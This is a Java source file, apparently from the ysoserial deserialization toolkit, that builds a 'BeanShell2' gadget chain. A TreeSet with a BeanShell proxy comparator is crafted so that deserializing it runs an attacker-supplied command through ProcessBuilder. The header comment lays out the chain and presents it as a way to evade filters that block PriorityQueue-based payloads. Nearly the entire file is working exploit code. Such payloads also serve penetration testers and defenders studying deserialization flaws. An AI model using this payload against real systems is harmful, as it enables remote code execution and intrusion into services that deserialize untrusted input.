package ysoserial.payloads;

import bsh.Interpreter;
import bsh.XThis;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.Comparator;
import java.util.TreeSet;

import ysoserial.Strings;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	BeanShell via TreeSet entry — bypasses PriorityQueue filters.

	Gadget chain:
		ObjectInputStream.readObject()
			TreeSet.readObject()
				TreeMap.put()
					Comparator(Proxy).compare()
						XThis$Handler.invoke()
							Interpreter.eval()
								ProcessBuilder.start()
									-> RCE

	Same BeanShell interpreter as BeanShell1 but with TreeSet entry
	instead of PriorityQueue. TreeSet is almost never filtered.

	Requires:
		bsh 2.0b5
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.beanshell:bsh:2.0b5"})
@Authors({ Authors.BOFEI_CHEN })
public class BeanShell2 extends PayloadRunner implements ObjectPayload<TreeSet> {

	public TreeSet getObject(String command) throws Exception {
		String payload =
			"compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" +
				Strings.join(
					Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\\"").split(" ")),
					",", "\"", "\"") +
				"}).start();return new Integer(1);}";

		Interpreter i = new Interpreter();
		i.eval(payload);

		XThis xt = new XThis(i.getNameSpace(), i);
		InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);

		Comparator comparator = (Comparator) Proxy.newProxyInstance(
			Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

		// TreeSet with BeanShell comparator — readObject → TreeMap.put → compare
		final TreeSet<Object> treeSet = new TreeSet<Object>(comparator);
		// Manually set backing TreeMap entries to avoid triggering compare during add
		final java.util.TreeMap backingMap = new java.util.TreeMap(comparator);
		Reflections.setFieldValue(treeSet, "m", backingMap);

		// Build TreeMap entries manually (same technique as ROME3 Hashtable)
		Object root = createTreeMapEntry(1, null, null, null, false);
		Object child = createTreeMapEntry(2, null, null, root, true);
		Reflections.setFieldValue(root, "right", child);
		Reflections.setFieldValue(backingMap, "root", root);
		Reflections.setFieldValue(backingMap, "size", 2);
		// modCount doesn't need to match for serialization

		return treeSet;
	}

	private static Object createTreeMapEntry(Object key, Object left, Object right, Object parent, boolean color) throws Exception {
		Class<?> entryClass = Class.forName("java.util.TreeMap$Entry");
		Object entry = Reflections.createWithoutConstructor(entryClass);
		Reflections.setFieldValue(entry, "key", key);
		Reflections.setFieldValue(entry, "value", java.util.Collections.EMPTY_SET); // TreeSet uses PRESENT
		Reflections.setFieldValue(entry, "left", left);
		Reflections.setFieldValue(entry, "right", right);
		Reflections.setFieldValue(entry, "parent", parent);
		Reflections.setFieldValue(entry, "color", color);
		return entry;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(BeanShell2.class, args);
	}
}
